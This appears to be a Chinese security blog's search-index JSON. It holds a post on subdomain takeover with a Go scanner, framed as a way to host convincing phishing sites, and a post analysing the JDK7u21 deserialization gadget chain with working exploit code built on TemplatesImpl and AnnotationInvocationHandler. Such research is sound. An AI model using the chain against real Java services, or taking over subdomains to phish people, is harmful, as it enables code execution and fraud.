[{"categories":["Golang","安全开发"],"content":"子域名接管安全性分析及落地化 能说只是为了学Go嘛？33333 Github项目直通车 ","date":"2022-06-06","objectID":"/1/:0:0","tags":null,"title":"子域名接管安全性分析及落地化","uri":"/1/"},{"categories":["Golang","安全开发"],"content":"简介 子域名接管，主要原因归结于失效dns记录未删除。 譬如，一条指向test.sec.com的CNAME记录未被删除，而test.sec.com已被注销，这个时候，如果攻击者如果注册了该域名，那么该子域名就会指向一个可控的主机或者域名上。 CNAME记录是最常被利用的，但其实A记录，NS记录等其他DNS记录也存在被接管的可能。 那么子域名在实战中又能发挥哪些作用？ 记得红队钓鱼时有一个钓鱼网站的操作，而往往为了更逼真，获取更高的可信度，往往将域名设置为一个和原域名很相似的域名。而如果能直接接管子域名中的CNAME记录，那岂不是很nice。所以子域名接管的利用主要就是为了高度伪造目标站点，提供高伪装性。 其他危害 ","date":"2022-06-06","objectID":"/1/:1:0","tags":null,"title":"子域名接管安全性分析及落地化","uri":"/1/"},{"categories":["Golang","安全开发"],"content":"DNS DNS主要就是将好记得域名解析为不好记的IP地址 DNS文档-RFC1034 DNS文档2-RFC1035 从1034到1035新增了几个记录，当下共有16中DNS记录，简要介绍其中和当前分析有关的几个记录类型： A 记录域名指向的主机ip NS 域名服务器记录，用来指定该域名由哪个DNS服务器来进行解析 CNAME 别名记录，允许您将多个名字映射到同一台计算机 MX 邮件交换记录，它指向一个邮件服务器 ","date":"2022-06-06","objectID":"/1/:2:0","tags":null,"title":"子域名接管安全性分析及落地化","uri":"/1/"},{"categories":["Golang","安全开发"],"content":"DNS记录与子域名接管 从上面几个DNS记录来看，如果是A记录，由于ip的可控性很低，虽然也存在类似的服务，例如弹性公网ip申请之类的，所以暂不考虑A记录的接管。而如果记录是指向一个域名的话，则往往可控性更高，可利用性也就更高。 ","date":"2022-06-06","objectID":"/1/:3:0","tags":null,"title":"子域名接管安全性分析及落地化","uri":"/1/"},{"categories":["Golang","安全开发"],"content":"Subtaker项目 有了上面的知识，现在就开始落地化了。 ","date":"2022-06-06","objectID":"/1/:4:0","tags":null,"title":"子域名接管安全性分析及落地化","uri":"/1/"},{"categories":["Golang","安全开发"],"content":"项目需求 判断记录是否被注销，可被重新申请注册 记录指向是否间接可控，例如github page ","date":"2022-06-06","objectID":"/1/:4:1","tags":null,"title":"子域名接管安全性分析及落地化","uri":"/1/"},{"categories":["Golang","安全开发"],"content":"设计思路 读取字典，遍历子域名的CNAME,MX记录 对收集到的记录进行分别判断其是否可注册 继续对CNAME记录进行指纹识别，看是否为间接可控 输出结果 ","date":"2022-06-06","objectID":"/1/:4:2","tags":null,"title":"子域名接管安全性分析及落地化","uri":"/1/"},{"categories":["Golang","安全开发"],"content":"存在的问题或者关键点 CNAME链解决(这里也许有什么CNAME-\u003eMX记录，但实战中存在的可能性较低，相反工具的性能降低，所以只对CNAME记录链进行处理) 线程控制实现方法：采用了信号量+锁的方式 高并发性的同时，怎么确保域名查询注册接口进行有效反馈？随机切换查询API+状态码判断 单个子域名对应多个记录，go中的net解析时被当作CNAME记录 奇奇怪怪的域名解析处理：CNAME解析最后一直返回同样的记录！MX记录进行CNAME记录查询解析竟然也会返回CNAME记录–》调换了MX记录和CNAME记录的判断顺序，但无疑会影响解析速度 部分页面例如Github是属于外网，访问速度很慢，或者干脆不能访问，这直接影响结果的准确率–》你们懂的 https://github.com/EdOverflow/can-i-take-over-xyz，这个仓库里还有很多可间接接管的指纹，但由于不常见，没有完全添加进去，感兴趣，可以自己添加进去试试。 ","date":"2022-06-06","objectID":"/1/:4:3","tags":null,"title":"子域名接管安全性分析及落地化","uri":"/1/"},{"categories":["Golang","安全开发"],"content":"项目展示 ","date":"2022-06-06","objectID":"/1/:4:4","tags":null,"title":"子域名接管安全性分析及落地化","uri":"/1/"},{"categories":["Java","安全研究"],"content":" 作为jdk中目前发现的原生链，还是有必要要分析这个用法的。全文仅限尽可能还原挖掘思路 ","date":"2022-05-16","objectID":"/2/:0:0","tags":null,"title":"jdk原生链分析","uri":"/2/"},{"categories":["Java","安全研究"],"content":"JDK7u21 在很多链中，TemplatesImpl一直发挥着不可或缺的作用，它是位于jdk源码中的一段Gadget:getOutputProperties()-\u003enewTransformer()-\u003egetTransletInstance()-\u003e... templatesImpl利用回顾: 加载对象需要是com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet的实现类 需要设置_name,_bytecodes _tfactory属性在高版本需要设置，jdk7u21中不是必须，看jdk版本而言-》defineTransletClasses 其中只要能触发上述任意一个函数的，都可以完成TemplatesImpl的动态加载字节码功能。 1. 所以我们看jdk中是否有调用这三个函数? 还记得sun.reflect.annotation.AnnotationInvocationHandler嘛？这可是java反序列化中的重要角色。而jdk7u21算是对其利用的再挖掘。 为了简单直接，我把反编译的代码中的var变量替换了自定义变量 //AnnotationInvocationHandler.java\rprivate Boolean equalsImpl(Object var1) {\rif (var1 == this) {\rreturn true;\r} else if (!this.type.isInstance(var1)) {\rreturn false;\r} else {\rMethod[] methods = this.getMemberMethods();//获取this.type的所有方法\r int methods_num = methods.length;\rfor(int var4 = 0; var4 \u003c methods_num; ++var4) {\rMethod var5 = methods[var4];\rString var6 = var5.getName();\rObject var7 = this.memberValues.get(var6);\rObject var8 = null;\rAnnotationInvocationHandler var9 = this.asOneOfUs(var1);//判断var1是否是代理类\r if (var9 != null) {\rvar8 = var9.memberValues.get(var6);\r} else {\rtry {\rvar8 = var5.invoke(var1); //调用任意方法\r } catch (InvocationTargetException var11) {\rreturn false;\r} catch (IllegalAccessException var12) {\rthrow new AssertionError(var12);\r}\r}\rif (!memberValueEquals(var7, var8)) {\rreturn false;\r}\r}\rreturn true;\r}\r}\rprivate Method[] getMemberMethods() {\rif (this.memberMethods == null) {\rthis.memberMethods = (Method[])AccessController.doPrivileged(new PrivilegedAction\u003cMethod[]\u003e() {\rpublic Method[] run() {\rMethod[] var1 = AnnotationInvocationHandler.this.type.getDeclaredMethods();\rAccessibleObject.setAccessible(var1, true);\rreturn var1;\r}\r});\r}\rreturn this.memberMethods;\r}\r 到这里，可以看到this.memberMethods可控，到现在也就是说如果能让AnnotationInvocationHandler调用equalImpl方法，且控制其中的memberMethods，就可以完成任意方法的调用了。 2.怎么触发equalsImpl？ public Object invoke(Object var1, Method var2, Object[] var3) {\rString var4 = var2.getName();\rClass[] var5 = var2.getParameterTypes();\rif (var4.equals(\"equals\") \u0026\u0026 var5.length == 1 \u0026\u0026 var5[0] == Object.class) {\rreturn this.equalsImpl(var3[0]);\r} else {\r......\r}\r}\r 关键逻辑：如果代理对象调用了equals方法，且满足equals方法有且仅有一个Object类型的参数。 当前exp,成功触发 //read evil bytecode-2\rFileInputStream is = new FileInputStream(\"D:\\\\Projects\\\\JAVA\\\\jdkSer\\\\target\\\\test-classes\\\\Aur0ra.class\");\rint available = is.available();\rbyte[] bytes = new byte[available];\ris.read(bytes,0,available);\r//construct TemplatesImpl\rTemplatesImpl templates = new TemplatesImpl();\rClass\u003c? extends TemplatesImpl\u003e clazz = templates.getClass();\rField bytecodes = clazz.getDeclaredField(\"_bytecodes\");\rbytecodes.setAccessible(true);\rbytecodes.set(templates,new byte[][]{bytes});\rField name = clazz.getDeclaredField(\"_name\");\rname.setAccessible(true);\rname.set(templates,\"Aur0ra\");\rClass\u003c?\u003e annoClass = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");\rConstructor\u003c?\u003e declaredConstructor = annoClass.getDeclaredConstructor(Class.class, Map.class);\rdeclaredConstructor.setAccessible(true);\rObject anno = declaredConstructor.newInstance(Annotation.class,new HashMap());\r//set anno.type\rsetValue(anno,\"type\",TemplatesImpl.class);\runsetFinal(anno,\"memberMethods\");\rsetValue(anno,\"memberMethods\",new Method[]{clazz.getDeclaredMethod(\"getOutputProperties\")});\rMap map = (Map) Proxy.newProxyInstance(Gadget.class.getClassLoader(), new Class[]{Map.class}, (InvocationHandler) anno);\rmap.equals(templates);\r 3.接下来就是想办法怎么触发equals方法，且参数可控 要求反序列化中会进行equals方法的，直接可以去全局搜索，这里借用codeql的话就很香了。 4.这里就直接丢出目前链子的利用点，直接采用hashMap之类的？为什么采用这个类呢？ //HashMap.java\rpublic V put(K key, V value) {\rif (key == null)\rreturn putForNullKey(value);\rint hash = hash(key);\rint i = indexFor(hash, table.length);\rfor (Entry\u003cK,V\u003e e = table[i]; e != null; e = e.next) {\rObject k;\rif (e.hash == hash \u0026\u0026 ((k = e.key) == key || key.equals(k))) {\rV oldValue = e.value;\re.value = value;\re.recordAccess(this);\rreturn oldValue;\r}\r}\rmodCount++;\raddEntry(hash, key, value, i);\rreturn null;\r}\r map类在反序列化时肯定进行put操作，这时，我们直接看put方法。其中会有equals操作，前提是key的hash相等，但key不","date":"2022-05-16","objectID":"/2/:1:0","tags":null,"title":"jdk原生链分析","uri":"/2/"},{"categories":["Java","安全研究"],"content":"疑点重重 为什么采用TemplatesImpl#newTransformer,而不直接采用getTransletInstance? 你试试就知道了。是因为最后调用时，getTransletInstance是private方法，无法被触发，所以采用了newTransformer,当然采用getOutputProperties也是可以的。 为什么很多地方给的不是hashmap而是LinkedHashSet等？ 采用LinkedHashSet是因为它重新进行put时，会按照既定的顺序，会直接影响利用结果。这里的话，似乎影响不大，但也有可能出现错误。 type需要使用Templates.class，而不是TemplatesImpl.class ","date":"2022-05-16","objectID":"/2/:1:1","tags":null,"title":"jdk原生链分析","uri":"/2/"},{"categories":["Java","安全研究"],"content":"修复与分析 为什么jdk7u21前的版本中，不是Annotation类照样可以成功运行exp呢？ 可以看到，这里type已成功赋值为目标Class对象，所以下面return的时候，不影响序列化的结果。 这里留个疑问：为什么明显目标需要是private final Class\u003c? extends Annotation\u003e type;，而这里放了一个TemplatesImpl在里面，这不是不合乎语法嘛？ 官方修复操作 ​ 如果不一致，就直接抛出异常，从而结束执行。 ​ 如果抛出异常被try-catch处理后，特殊情况下是不是会存在被利用的可能性呢？ ","date":"2022-05-16","objectID":"/2/:1:2","tags":null,"title":"jdk原生链分析","uri":"/2/"},{"categories":["Java","安全研究"],"content":"拓展分析 jdk的很多版本都是并行开发的，那是不是说有可能这个jdk7u21在其他版本的jdk中也存在呢？ ​ 通过对比开发时间，jdk8出来时(2017年)，这个已经被修复了，所以以上就不存在利用了。那是不是jdk\u003cjdk7都存在这个洞呢？也不是，因为是并行开发的，jdk6或者其他版本也是在更新迭代，所以也只有部分jdk6或者其他版本收到影响。 ","date":"2022-05-16","objectID":"/2/:1:3","tags":null,"title":"jdk原生链分析","uri":"/2/"},{"categories":["Java","安全研究"],"content":"JDK8u20 好像和上面留的思路一致，就是利用try-catch机制，处理异常，并继续运行put操作。 关键点：beancontextsupport 这里就先不做分析了，更多的是涉及序列化处理的操作。再另一篇文章分析。 ","date":"2022-05-16","objectID":"/2/:2:0","tags":null,"title":"jdk原生链分析","uri":"/2/"},{"categories":["Java","安全研究"],"content":"参考 java 安全漫谈 jdk8u20反序列化分析 ","date":"2022-05-16","objectID":"/2/:3:0","tags":null,"title":"jdk原生链分析","uri":"/2/"},{"categories":null,"content":"Hello Aur0ra ","date":"2022-05-11","objectID":"/hello/:0:0","tags":null,"title":"Hello World","uri":"/hello/"}]